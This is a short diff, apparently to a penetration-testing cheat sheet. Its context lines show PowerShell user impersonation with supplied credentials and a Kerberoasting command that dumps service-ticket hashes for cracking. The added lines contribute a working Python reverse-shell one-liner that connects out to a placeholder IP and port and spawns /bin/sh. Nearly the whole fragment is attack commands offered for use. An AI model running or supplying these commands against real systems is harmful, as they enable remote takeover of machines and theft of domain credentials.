@@ -73,3 +73,6 @@ $Cred = New-Object System.Management.Automation.PSCredential('domain\user', $Sec
 Invoke-UserImpersonation -Credential $Cred
 Invoke-kerberoast | fl  { default format of key is john but format can be changed in hashcat}
 
+Python shell payload :
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("ip",port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");';
+
